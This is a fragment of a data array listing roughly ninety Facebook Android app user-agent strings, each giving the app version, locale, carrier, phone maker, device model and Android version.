"[FBAN/FB4A;FBAV/151.0.0.44.205;FBBV/81374851;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/Hisense;FBBD/Hisense;FBPN/com.facebook.katana;FBDV/Hisense L678;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/155.0.0.36.96;FBBV/87995188;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/88494159;FBCR/NOS;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/NOS NOVU II;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/37.0.0.48.234;FBBV/12793182;FBDM/{density=1.5,width=480,height=800};FBLC/pt_PT;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/85070460;FBCR/altice MEO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3X;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/177.0.0.49.105;FBBV/114406492;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920C;FBSV/7.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/245.0.0.39.118;FBBV/ 180475968;FBDM/ (density=2.0,width=720,height=1280}; FBLC/ es_LA;FBRV/181817659FBCR/TELCELFBMF/ Hisense;FBBD/Hisense;FBPN/ com.facebook.katana;FBDV/Hisense Hi 3;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi]",
"[FBAN/FB4A;FBAV/245.0.0.39.118; FBBV/180475968;FBDM/ (density=2.0,width=720,height=1280};FBLC/ es_LA;FBRV/ 181817659;FBCR/TELCEL,FBMF/ Hisense;FBBD/Hisense;FBPN/ com.facebook.katana;FBDV/Hisense Hi 3;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi]",
"[FBAN/FB4A;FBAV/245.0.0.39.118; FBBV/180475968;FBDM/ (density=2.0,width=720,height=1280};FBLC/ es_LA;FBRV/ 181817659;FBCR/TELCEL,FBMF/ Hisense;FBBD/Hisense;FBPN/ com.facebook.katana;FBDV/HisenseHi3;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi]",
"[FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/184895505;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/245.0.0.39.118;FBBV/180475968;FBDM/{density=1.7,width=720,height=1280};FBLC/es_LA;FBRV/0;FB_FW/2;FBCR/UNEFON 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto C Plus;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540730;FBDM/{density=2.0,width=720,height=1196};FBLC/es_ES;FBRV/0;FBCR/HOME;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X210;FBSV/7.1.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/243.0.0.47.108;FBBV/178056661;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/179063150;FBCR/3;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/243.0.0.47.108;FBBV/178056661;FBDM/{density=3.0,width=1080,height=2175};FBLC/en_GB;FBRV/179063150;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542502;FBDM/{density=3.0,width=1080,height=2175};FBLC/en_US;FBRV/197499199;FBCR/Freedom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950W;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188827981;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBRV/192128667;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/255.0.0.33.121;FBBV/195354898;FBDM/{density=2.75,width=1080,height=2088};FBLC/en_US;FBRV/197167215;FBCR/Vodafone AU;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542500;FBDM/{density=2.0,width=720,height=1371};FBLC/en_US;FBRV/198223028;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034615;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/etisalat;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542473;FBDM/{density=1.5,width=480,height=854};FBLC/es_ES;FBRV/0;FBCR/TELCEL;FBMF/alps;FBBD/Bmobile;FBPN/com.facebook.katana;FBDV/AX1035;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851411;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/198929583;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542486;FBDM/{density=1.75,width=720,height=1396};FBLC/ro_RO;FBRV/198377061;FBCR/BASE | Lycamobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415FN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542502;FBDM/{density=3.0,width=1080,height=2029};FBLC/ro_RO;FBRV/198310449;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542486;FBDM/{density=1.75,width=720,height=1382};FBLC/en_GB;FBRV/198200879;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105FN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851400;FBDM/{density=2.0,width=720,height=1280};FBLC/ro_RO;FBRV/199381886;FBCR/Vodafone RO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851411;FBDM/{density=4.0,width=1440,height=2706};FBLC/ro_RO;FBRV/199566458;FBCR/orange;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542476;FBDM/{density=3.0,width=1080,height=1798};FBLC/en_US;FBRV/198442689;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-TP450;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294418;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBRV/0;FBCR/BITE;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-8504X;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851411;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_GB;FBRV/199674405;FBCR/Virgin;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9500;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009847;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/entel;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/259.0.0.28.115;FBBV/199867660;FBDM/{density=2.0,width=720,height=1406};FBLC/en_GB;FBRV/0;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294666;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBRV/200600534;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/F8331;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/200600534;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294464;FBDM/{density=2.25,width=720,height=1280};FBLC/en_GB;FBRV/200290264;FBCR/O2 - UK;FBMF/Blackview;FBBD/Blackview;FBPN/com.facebook.katana;FBDV/A7;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/{density=3.0,width=1080,height=2032};FBLC/en_GB;FBRV/200489847;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L31;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/245.0.0.39.118;FBBV/180475978;FBDM/{density=2.25,width=720,height=1332};FBLC/es_ES;FBRV/181817659;FBCR/Movistar;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/W-V600;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/259.0.0.36.115;FBBV/200359555;FBDM/{density=3.0,width=1080,height=2016};FBLC/nb_NO;FBRV/201364573;FBCR/Telia N;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H8266;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/253.0.0.28.116;FBBV/193013911;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/194773382;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1706;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/{density=2.625.0,width=1080,height=2198};FBLC/ko_KR;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A908N;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518851;FBDM/{density=2.75,width=1080,height=2131};FBLC/it_IT;FBRV/202206671;FBCR/I TIM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518813;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/202499965;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J727V;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/262.0.0.29.117;FBBV/203434615;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681565;FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997198;FBDM/{density=3.0,width=1080,height=2120};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997197;FBDM/{density=2.25,width=720,height=1393};FBLC/bg_BG;FBRV/0;FBCR/A1 BG;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997198;FBDM/{density=3.0,width=1080,height=2024};FBLC/en_US;FBRV/204600260;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997197;FBDM/{density=2.25,width=720,height=1393};FBLC/bg_BG;FBRV/204734771;FBCR/A1 BG #STAYHOME;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997168;FBDM/{density=3.0,width=1080,height=1812};FBLC/ru_RU;FBRV/204734771;FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851391;FBDM/{density=3.0,width=1080,height=1812};FBLC/en_US;FBRV/201443087;FBCR/Our Telekom;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI MT7-TL10;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997183;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBRV/205339004;FBCR/entel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997166;FBDM/{density=2.25,width=720,height=1172};FBLC/it_IT;FBRV/0;FBCR/vodafone IT;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/U PULSE LITE;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281685;FBDM/{density=4.1625,width=1440,height=2589};FBLC/en_US;FBRV/206069743;FBCR/Sprint;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281661;FBDM/{density=1.5,width=1920,height=1128};FBLC/en_US;FBRV/0;FBCR/;FBMF/Quanta;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/QTAIR7;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681576;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/204267645;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281684;FBDM/{density=3.5,width=1440,height=2907};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281663;FBDM/{density=2.0,width=720,height=1187};FBLC/en_US;FBRV/206347851;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/LGMS210;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281684;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_US;FBRV/206381115;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281664;FBDM/{density=3.0,width=1080,height=1920};FBLC/hr_HR;FBRV/206442014;FBCR/HT HR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281661;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/0;FBCR/cricket;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Z851M;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281674;FBDM/{density=2.0,width=720,height=1344};FBLC/hi_IN;FBRV/0;FBCR/Idea - Be Safe;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/207716779;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/207875213;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=3.0,width=1080,height=2037};FBLC/en_GB;FBRV/208178433;FBCR/EE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CLT-L09;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/208308484;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=4.0,width=1440,height=2699};FBLC/en_US;FBRV/208187001;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636717;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/208412355;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636728;FBDM/{density=3.0,width=1080,height=2076};FBLC/es_LA;FBRV/208541728;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173642;FBDM/{density=3.0,width=1080,height=2024};FBLC/en_US;FBRV/208655939;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.0,width=720,height=1384};FBLC/en_US;FBRV/208490569;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173522;FBDM/{density=1.5,width=1920,height=1200};FBLC/en_US;FBRV/209005401;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T580;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448488;FBDM/{density=1.5,width=480,height=888};FBLC/en_US;FBRV/0;FBCR/Verizon Wireless;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/A502DL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173642;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/209076735;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.38.124;FBBV/208588814;FBDM/{density=2.25,width=720,height=1473};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681550;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/209458419;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518776;FBDM/{density=2.25,width=720,height=1172};FBLC/es_LA;FBRV/203119134;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2200};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/209644275;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540762;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/255.0.0.33.121;FBBV/195354855;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Idea;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.825,width=1440,height=2696};FBLC/en_US;FBRV/210019826;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636693;FBDM/{density=2.75,width=1080,height=1920};FBLC/en_US;FBRV/208541728;FBCR/Tsel-DiRumahAja;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/210063235;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=2.625,width=1080,height=2147};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-V405;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/210101121;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/210430229;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
